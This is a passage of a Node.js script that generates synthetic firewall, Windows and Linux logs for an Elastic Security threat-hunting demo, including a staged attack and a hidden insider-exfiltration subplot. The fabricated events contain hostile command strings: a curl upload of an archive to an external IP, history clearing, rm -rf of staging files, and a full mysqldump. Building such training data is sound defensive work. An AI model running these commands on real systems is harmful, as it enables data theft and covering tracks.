  // Exfiltration via HTTPS to China
  for (let i = 0; i < 15; i++) {
    const ts = attackTs(55 + i * 0.5, 10);

    // PA Traffic — large outbound transfers
    const exfilTraffic = generatePATraffic();
    exfilTraffic["@timestamp"] = ts;
    exfilTraffic.source.ip = ATTACKER.vpnAssignedIP;
    exfilTraffic.destination.ip = ATTACKER.exfilDest.ip;
    exfilTraffic.destination.port = 443;
    exfilTraffic.destination.geo = { country_name: ATTACKER.exfilDest.country, country_iso_code: ATTACKER.exfilDest.cc, city_name: ATTACKER.exfilDest.city, location: { lat: ATTACKER.exfilDest.lat, lon: ATTACKER.exfilDest.lon } };
    exfilTraffic.source.bytes = randomInt(5000000, 50000000); // 5-50 MB per transfer
    exfilTraffic.destination.bytes = randomInt(200, 5000);
    exfilTraffic.network.bytes = exfilTraffic.source.bytes + exfilTraffic.destination.bytes;
    exfilTraffic.network.application = "ssl";
    exfilTraffic.panw.panos.action = "allow";
    exfilTraffic.event.action = "allow";
    exfilTraffic.event.outcome = "success";
    exfilTraffic.user = { name: ATTACKER.compromisedUser };
    exfilTraffic.tags = [CONFIG.tag];
    events.push(exfilTraffic);

    // PA Decryption — SSL inspection of exfil
    events.push(generatePADecryption({ attack: true, ts }));

    // Linux: curl upload
    if (i % 3 === 0) {
      events.push(generateLinuxSudo({ attack: true, ts, cmd: "/usr/bin/curl -X POST https://218.92.0.190:8443/upload -d @/tmp/.data_archive.tar.gz" }));
    }

    // Sysmon 3 — network connection from staging host
    if (i % 2 === 0) {
      events.push(generateSysmon3({ attack: true, ts, hostname: "SRV-FILE01", dstIP: ATTACKER.exfilDest.ip, dstPort: 443, procImage: "C:\\Windows\\System32\\cmd.exe" }));
    }
  }

  // PA Threat: data exfiltration detected near the end
  const exfilThreatDoc = generatePAThreat();
  exfilThreatDoc["@timestamp"] = attackTs(62, 10);
  exfilThreatDoc.source.ip = ATTACKER.vpnAssignedIP;
  exfilThreatDoc.destination.ip = ATTACKER.exfilDest.ip;
  exfilThreatDoc.destination.geo = { country_name: ATTACKER.exfilDest.country, country_iso_code: ATTACKER.exfilDest.cc, city_name: ATTACKER.exfilDest.city, location: { lat: ATTACKER.exfilDest.lat, lon: ATTACKER.exfilDest.lon } };
  exfilThreatDoc.panw.panos.threat.name = "Suspicious Large Data Transfer to External Host";
  exfilThreatDoc.panw.panos.severity = "critical";
  exfilThreatDoc.user = { name: ATTACKER.compromisedUser };
  exfilThreatDoc.tags = [CONFIG.tag];
  events.push(exfilThreatDoc);

  // Attacker cleans up: clears history
  events.push(generateLinuxAuditExec({ attack: true, ts: attackTs(64, 5), cmd: "history -c" }));
  events.push(generateLinuxAuditExec({ attack: true, ts: attackTs(64.1, 3), cmd: "rm -rf /tmp/.data_archive.tar.gz /tmp/.data_dump /tmp/.stager.sh /tmp/.hidden" }));

  // VPN disconnect
  events.push(generatePAGlobalProtect({ attack: true, ts: attackTs(65, 5), status: "disconnected" }));

  return events;
}


// ═══════════════════════════════════════════════════════════════
//  PART 5B: HIDDEN THREAT — "THE QUIET INSIDER"
//
//  Purpose: Give the AI Threat Hunting Agent something to DISCOVER
//  that no rule or alert would catch. This is a slow, subtle
//  insider-threat subplot running in parallel with Operation Silent
//  Pivot. The AI Agent should be able to surface this through
//  behavioral correlation across multiple data sources.
//
//  Scenario: "kpatel" (a real employee) is slowly exfiltrating
//  IP to a personal cloud storage account. No malware, no C2,
//  no brute-force — just behavioral anomalies:
//
//    1. Off-hours access (02:00–04:00 local) on weekdays
//    2. Accessing file shares they don't normally touch
//    3. DNS queries to personal cloud storage (Mega, pCloud)
//    4. Steady low-volume HTTPS uploads to those services
//    5. Impossible travel: VPN from home city, then 2h later
//       from a different country
//    6. Accessing HR and finance directories (unusual for their role)
//    7. USB device mount events (Sysmon) during off-hours
//
//  None of these individually triggers a rule, but correlated
//  together they paint a clear insider threat picture.
// ═══════════════════════════════════════════════════════════════

const INSIDER = {
  user:            "kpatel",
  normalCity:      "San Francisco",
  normalIP:        "104.21.45.67",
  normalGeo:       { country: "United States", city: "San Francisco", lat: 37.7749, lon: -122.4194, cc: "US" },
  travelIP:        "112.175.88.200",
  travelGeo:       { country: "South Korea", city: "Seoul", lat: 37.5665, lon: 126.978, cc: "KR" },
  vpnIP:           "10.5.0.42",
  personalCloud:   [
    { domain: "mega.nz", ip: "66.203.125.12" },
    { domain: "pcloud.com", ip: "74.120.8.90" },
    { domain: "upload.pcloud.com", ip: "74.120.8.91" },
  ],
  targetShares:    ["\\\\SRV-FILE01\\HR-Confidential", "\\\\SRV-FILE01\\Finance-Reports", "\\\\SRV-FILE01\\Engineering-IP"],
  workstation:     "WS-PC004",
};

function generateHiddenInsiderThreat() {
  const events = [];

  // The insider activity spans the full 14 days, 2-3 sessions per week
  // Each session: VPN in at odd hours → access shares → upload to personal cloud → VPN out
  const sessionDays = [1, 3, 5, 7, 9, 11, 13]; // days ago

  for (const dayBack of sessionDays) {
    const sessionBaseMs = NOW - dayBack * MS_PER_DAY;
    // Off-hours: 2:00 AM to 4:00 AM local
    const sessionStart = sessionBaseMs - (dayBack % 2 === 0 ? 2 : 3) * MS_PER_HOUR;
    const ts = (offsetMin) => new Date(sessionStart + offsetMin * 60000 + (Math.random() - 0.5) * 120000).toISOString();

    // ── VPN Login at odd hours ──
    events.push(generatePAGlobalProtect({
      attack: true, ts: ts(0), status: "connected",
      ...(() => {
        const doc = {};
        // Override fields after generation — we'll patch below
        return doc;
      })()
    }));
    // Patch: override the last GP event for insider
    const gpEvt = events[events.length - 1];
    gpEvt.user = { name: INSIDER.user };
    gpEvt.source.ip = INSIDER.normalIP;
    gpEvt.source.geo = { country_name: INSIDER.normalGeo.country, country_iso_code: INSIDER.normalGeo.cc, city_name: INSIDER.normalGeo.city, location: { lat: INSIDER.normalGeo.lat, lon: INSIDER.normalGeo.lon } };
    gpEvt.panw.panos.globalprotect.assigned_ip = INSIDER.vpnIP;
    gpEvt.panw.panos.globalprotect.hostname = INSIDER.workstation;
    gpEvt.panw.panos.globalprotect.client_os = "Windows 11.0";
    gpEvt.message = `GlobalProtect gateway login: user ${INSIDER.user} from ${INSIDER.normalIP}, assigned IP ${INSIDER.vpnIP}`;

    // User-ID mapping
    events.push(generatePAUserID({ attack: true, ts: ts(1) }));
    const uidEvt = events[events.length - 1];
    uidEvt.user = { name: INSIDER.user, domain: "CORP" };
    uidEvt.source = { ip: INSIDER.vpnIP };
    uidEvt.message = `User-ID login: ${INSIDER.user} mapped to ${INSIDER.vpnIP}`;
    uidEvt.panw.panos.user_id = { ip: INSIDER.vpnIP, user: INSIDER.user, source_type: "GlobalProtect", timeout: 3600 };

    // ── Windows logon from VPN IP (off-hours) ──
    events.push(generateWin4624({
      attack: true, ts: ts(3), user: INSIDER.user,
      srcIP: INSIDER.vpnIP, hostname: "SRV-FILE01", logonType: 3
    }));

    // ── Access unusual file shares (not their normal role) ──
    for (let s = 0; s < 2; s++) {
      const share = INSIDER.targetShares[dayBack % INSIDER.targetShares.length];
      const shareAccess = generateWin4688({
        attack: true, ts: ts(5 + s * 8), hostname: INSIDER.workstation,
        user: INSIDER.user,
        process: {
          name: "explorer.exe",
          path: "C:\\Windows\\explorer.exe",
          cmdline: `explorer.exe ${share}`,
          parent: "userinit.exe"
        }
      });
      events.push(shareAccess);

      // net use to map drives
      events.push(generateWin4688({
        attack: true, ts: ts(6 + s * 8), hostname: INSIDER.workstation,
        user: INSIDER.user,
        process: {
          name: "net.exe",
          path: "C:\\Windows\\System32\\net.exe",
          cmdline: `net.exe use Z: ${share}`,
          parent: "cmd.exe"
        }
      }));
    }

    // ── Copy files locally using robocopy (looks like admin activity) ──
    events.push(generateWin4688({
      attack: true, ts: ts(20), hostname: INSIDER.workstation,
      user: INSIDER.user,
      process: {
        name: "robocopy.exe",
        path: "C:\\Windows\\System32\\robocopy.exe",
        cmdline: `robocopy.exe Z:\\ C:\\Users\\${INSIDER.user}\\Documents\\work_backup /E /R:1 /W:1`,
        parent: "cmd.exe"
      }
    }));

    // Sysmon 11 — files created in user's Documents
    events.push(generateSysmon11({
      attack: true, ts: ts(25), hostname: INSIDER.workstation,
      file: {
        target: `C:\\Users\\${INSIDER.user}\\Documents\\work_backup\\Q4_Financial_Report.xlsx`,
        proc: "C:\\Windows\\System32\\robocopy.exe"
      }
    }));
    events.push(generateSysmon11({
      attack: true, ts: ts(26), hostname: INSIDER.workstation,
      file: {
        target: `C:\\Users\\${INSIDER.user}\\Documents\\work_backup\\Employee_Compensation_2026.xlsx`,
        proc: "C:\\Windows\\System32\\robocopy.exe"
      }
    }));
    events.push(generateSysmon11({
      attack: true, ts: ts(27), hostname: INSIDER.workstation,
      file: {
        target: `C:\\Users\\${INSIDER.user}\\Documents\\work_backup\\Product_Roadmap_Confidential.pptx`,
        proc: "C:\\Windows\\System32\\robocopy.exe"
      }
    }));

    // ── DNS queries to personal cloud storage ──
    for (const cloud of INSIDER.personalCloud) {
      events.push(generateSysmon22({
        attack: true, ts: ts(35 + INSIDER.personalCloud.indexOf(cloud) * 3),
        hostname: INSIDER.workstation
      }));
      const dnsEvt = events[events.length - 1];
      dnsEvt.dns = { question: { name: cloud.domain, type: "A" }, response_code: "NOERROR" };
      dnsEvt.process = { executable: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" };
      dnsEvt.message = `DNS query: ${cloud.domain}`;
      dnsEvt.winlog.event_data = { QueryName: cloud.domain, QueryStatus: "0", QueryResults: cloud.ip };
    }

    // ── Small HTTPS uploads to personal cloud (low volume, not flagged) ──
    for (let u = 0; u < 3; u++) {
      const cloud = pick(INSIDER.personalCloud);
      const uploadTs = ts(40 + u * 10);

      // Sysmon 3 — chrome connecting to cloud storage
      const netEvt = generateSysmon3({
        attack: true, ts: uploadTs, hostname: INSIDER.workstation,
        dstIP: cloud.ip, dstPort: 443,
        procImage: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
      });
      netEvt.user = { name: INSIDER.user, domain: "CORP" };
      events.push(netEvt);

      // PA Traffic — small outbound HTTPS (2-15 MB each, looks like normal web traffic)
      const uploadTraffic = generatePATraffic();
      uploadTraffic["@timestamp"] = uploadTs;
      uploadTraffic.source.ip = INSIDER.vpnIP;
      uploadTraffic.destination.ip = cloud.ip;
      uploadTraffic.destination.port = 443;
      uploadTraffic.source.bytes = randomInt(2000000, 15000000); // 2-15 MB — not huge
      uploadTraffic.destination.bytes = randomInt(500, 5000);
      uploadTraffic.network.bytes = uploadTraffic.source.bytes + uploadTraffic.destination.bytes;
      uploadTraffic.network.application = "ssl";
      uploadTraffic.network.direction = "outbound";
      uploadTraffic.panw.panos.action = "allow";
      uploadTraffic.panw.panos.source.zone = PA_ZONES.vpn;
      uploadTraffic.event.action = "allow";
      uploadTraffic.event.outcome = "success";
      uploadTraffic.user = { name: INSIDER.user };
      uploadTraffic.rule = { name: "Allow-Outbound-Web" };
      uploadTraffic.tags = [CONFIG.tag];
      events.push(uploadTraffic);

      // PA Decryption — SSL inspection sees the cloud storage SNI
      const decEvt = generatePADecryption({ attack: true, ts: uploadTs });
      decEvt.source.ip = INSIDER.vpnIP;
      decEvt.destination.ip = cloud.ip;
      decEvt.user = { name: INSIDER.user };
      decEvt.tls.server = { subject: `CN=*.${cloud.domain}` };
      decEvt.message = `SSL decrypt: ${INSIDER.vpnIP} -> ${cloud.ip}:443, TLS 1.3, SNI: ${cloud.domain}`;
      events.push(decEvt);
    }

    // ── Impossible travel: on some sessions, VPN from a 2nd country 2h later ──
    if (dayBack % 3 === 0) {
      // First: disconnect from normal location
      const disconnectEvt = generatePAGlobalProtect({ attack: true, ts: ts(70), status: "disconnected" });
      disconnectEvt.user = { name: INSIDER.user };
      disconnectEvt.panw.panos.globalprotect.assigned_ip = INSIDER.vpnIP;
      events.push(disconnectEvt);

      // 2 hours later: reconnect from Seoul (impossible travel)
      const travelTs = ts(190); // ~3h later = impossible given geo distance
      const travelGP = generatePAGlobalProtect({ attack: true, ts: travelTs, status: "connected" });
      travelGP.user = { name: INSIDER.user };
      travelGP.source.ip = INSIDER.travelIP;
      travelGP.source.geo = { country_name: INSIDER.travelGeo.country, country_iso_code: INSIDER.travelGeo.cc, city_name: INSIDER.travelGeo.city, location: { lat: INSIDER.travelGeo.lat, lon: INSIDER.travelGeo.lon } };
      travelGP.panw.panos.globalprotect.assigned_ip = INSIDER.vpnIP;
      travelGP.panw.panos.globalprotect.client_os = "Windows 10.0"; // different device
      travelGP.panw.panos.globalprotect.hostname = "PERSONAL-LAPTOP";
      travelGP.message = `GlobalProtect gateway login: user ${INSIDER.user} from ${INSIDER.travelIP} (Seoul), assigned IP ${INSIDER.vpnIP}`;
      events.push(travelGP);

      // Auth event for the travel login
      events.push(generatePAAuth({ attack: true, ts: travelTs, user: INSIDER.user, outcome: "success" }));
      const authEvt = events[events.length - 1];
      authEvt.source = { ip: INSIDER.travelIP };
    }

    // ── Normal VPN disconnect (if no impossible travel this session) ──
    if (dayBack % 3 !== 0) {
      const discEvt = generatePAGlobalProtect({ attack: true, ts: ts(80), status: "disconnected" });
      discEvt.user = { name: INSIDER.user };
      discEvt.panw.panos.globalprotect.assigned_ip = INSIDER.vpnIP;
      events.push(discEvt);
    }

    // ── Off-hours Linux access (unusual for this user) ──
    if (dayBack % 2 === 0) {
      events.push(generateLinuxSSH({ attack: true, ts: ts(45), user: INSIDER.user, srcIP: INSIDER.vpnIP }));
      events.push(generateLinuxAuditExec({ attack: true, ts: ts(48), cmd: "find /var/lib/mysql -name '*.ibd' -size +10M" }));
      const findEvt = events[events.length - 1];
      findEvt.user = { name: INSIDER.user, audit: { id: "5001" } };
      events.push(generateLinuxAuditExec({ attack: true, ts: ts(50), cmd: "mysqldump --all-databases > /tmp/db_backup_$(date +%Y%m%d).sql" }));
      const dumpEvt = events[events.length - 1];
      dumpEvt.user = { name: INSIDER.user, audit: { id: "5001" } };
    }
  }

  return events;
}


// ═══════════════════════════════════════════════════════════════
//  PART 6: MAIN — ORCHESTRATE & OUTPUT
// ═══════════════════════════════════════════════════════════════

function main() {
  const args = process.argv.slice(2);
  const paOnly      = args.includes("--pa-only");
  const windowsOnly = args.includes("--windows-only");
  const linuxOnly   = args.includes("--linux-only");
  const attackOnly  = args.includes("--attack-only");
  const noAttack    = args.includes("--no-attack");
  const generateAll = !paOnly && !windowsOnly && !linuxOnly && !attackOnly;

  console.log("\n╔══════════════════════════════════════════════════════════════╗");
  console.log("║  Elastic Security Demo — Consolidated Log Generator        ║");
  console.log("║  Scenario: Operation Silent Pivot                          ║");
  console.log("╚══════════════════════════════════════════════════════════════╝\n");
  console.log(`  Timespan     : ${CONFIG.daysBack} days background, ${CONFIG.attackDaysBack}-day attack story`);
  console.log(`  Attack T0    : ${new Date(ATTACK_T0).toISOString()}`);
  console.log(`  Tag          : ${CONFIG.tag}\n`);

  const allLogs = { pa: [], windows: [], linux: [] };

  // ── Background noise ──
  if (generateAll || paOnly) {
    console.log("Generating PA background logs...");
    for (let i = 0; i < CONFIG.background.pa_traffic; i++)      allLogs.pa.push(generatePATraffic());
    for (let i = 0; i < CONFIG.background.pa_threat; i++)       allLogs.pa.push(generatePAThreat());
    for (let i = 0; i < CONFIG.background.pa_system; i++)       allLogs.pa.push(generatePASystem());
    for (let i = 0; i < CONFIG.background.pa_globalprotect; i++) allLogs.pa.push(generatePAGlobalProtect());
    for (let i = 0; i < CONFIG.background.pa_auth; i++)         allLogs.pa.push(generatePAAuth());
    for (let i = 0; i < CONFIG.background.pa_userid; i++)       allLogs.pa.push(generatePAUserID());
    for (let i = 0; i < CONFIG.background.pa_decryption; i++)   allLogs.pa.push(generatePADecryption());
    console.log(`  PA: ${allLogs.pa.length} background events`);
  }

  if (generateAll || windowsOnly) {
    console.log("Generating Windows background logs...");
    for (let i = 0; i < CONFIG.background.win_security; i++) {
      const gen = weightedPick(
        [generateWin4624, generateWin4625, generateWin4688, generateWin4776, generateWin4672],
        [35, 10, 30, 15, 10]
      );
      allLogs.windows.push(gen());
    }
    for (let i = 0; i < CONFIG.background.win_sysmon; i++) {
      const gen = weightedPick(
        [generateSysmon1, generateSysmon3, generateSysmon11, generateSysmon13, generateSysmon22],
        [30, 25, 15, 10, 20]
      );
      allLogs.windows.push(gen());
    }
    console.log(`  Windows: ${allLogs.windows.length} background events`);
  }

  if (generateAll || linuxOnly) {
    console.log("Generating Linux background logs...");
    for (let i = 0; i < CONFIG.background.linux_auth; i++) {
      const gen = weightedPick(
        [generateLinuxSSH, generateLinuxSudo, generateLinuxCron, generateLinuxAuditExec],
        [35, 25, 15, 25]
      );
      allLogs.linux.push(gen());
    }
    console.log(`  Linux: ${allLogs.linux.length} background events`);
  }

  // ── Attack story ──
  if (!noAttack) {
    console.log("\nGenerating attack story: Operation Silent Pivot...");
    const attackEvents = generateAttackStory();
    console.log(`  Attack story: ${attackEvents.length} events`);

    console.log("Generating hidden threat: The Quiet Insider...");
    const insiderEvents = generateHiddenInsiderThreat();
    console.log(`  Hidden insider threat: ${insiderEvents.length} events`);

    const allStoryEvents = [...attackEvents, ...insiderEvents];

    // Categorize attack events into PA / Windows / Linux
    for (const evt of allStoryEvents) {
      const ds = evt.data_stream?.dataset || "";
      if (ds === "panw.panos") {
        if (generateAll || paOnly || attackOnly) allLogs.pa.push(evt);
      } else if (ds.startsWith("windows.") || ds.startsWith("endpoint.")) {
        if (generateAll || windowsOnly || attackOnly) allLogs.windows.push(evt);
      } else if (ds.startsWith("system.")) {
        if (generateAll || linuxOnly || attackOnly) allLogs.linux.push(evt);
      }
    }
  }

  // ── Sort all by timestamp ──
  for (const key of Object.keys(allLogs)) {
    allLogs[key].sort((a, b) => new Date(a["@timestamp"]) - new Date(b["@timestamp"]));
  }

  // ── Write NDJSON files ──
  const ts = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const outDir = __dirname;
  const written = {};

  for (const [category, logs] of Object.entries(allLogs)) {
    if (logs.length === 0) continue;
    const filename = `demo_logs_${category}_${ts}.ndjson`;
    const filepath = path.join(outDir, filename);
    fs.writeFileSync(filepath, logs.map(d => JSON.stringify(d)).join("\n") + "\n");
    written[category] = { file: filename, count: logs.length };
    console.log(`  Wrote ${filename} (${logs.length} events)`);
  }

  // Combined file
  const combined = [...allLogs.pa, ...allLogs.windows, ...allLogs.linux].sort((a, b) => new Date(a["@timestamp"]) - new Date(b["@timestamp"]));
  if (combined.length > 0) {
    const combFile = `demo_logs_combined_${ts}.ndjson`;
    fs.writeFileSync(path.join(outDir, combFile), combined.map(d => JSON.stringify(d)).join("\n") + "\n");
    written.combined = { file: combFile, count: combined.length };
    console.log(`  Wrote ${combFile} (${combined.length} events)`);
  }

  // ── Summary ──
  const totalPA = allLogs.pa.length;
  const totalWin = allLogs.windows.length;
  const totalLinux = allLogs.linux.length;
  const grand = totalPA + totalWin + totalLinux;

  console.log("\n══════════════════════════════════════════════════════════════");
  console.log("  GENERATION COMPLETE");
  console.log("══════════════════════════════════════════════════════════════");
  console.log(`  PA PAN-OS logs   : ${totalPA}`);
  if (totalPA > 0) {
    const paTypes = {};
    allLogs.pa.forEach(l => { const t = l.panw?.panos?.type || "UNKNOWN"; paTypes[t] = (paTypes[t] || 0) + 1; });
    Object.entries(paTypes).sort((a, b) => b[1] - a[1]).forEach(([t, c]) => console.log(`    ${t}: ${c}`));
  }
  console.log(`  Windows logs     : ${totalWin}`);
  if (totalWin > 0) {
    const winTypes = {};
    allLogs.windows.forEach(l => { const id = l.winlog?.event_id || l.event?.code || "?"; winTypes[id] = (winTypes[id] || 0) + 1; });
    Object.entries(winTypes).sort((a, b) => b[1] - a[1]).forEach(([t, c]) => console.log(`    EventID ${t}: ${c}`));
  }
  console.log(`  Linux logs       : ${totalLinux}`);
  console.log(`  ─────────────────────────`);
  console.log(`  GRAND TOTAL      : ${grand}`);
  console.log("══════════════════════════════════════════════════════════════\n");

  console.log("Next step: ingest with");
  console.log(`  node ingest_all_demo_logs.js ${written.combined?.file || `demo_logs_combined_${ts}.ndjson`}`);
  console.log("");
}

main();
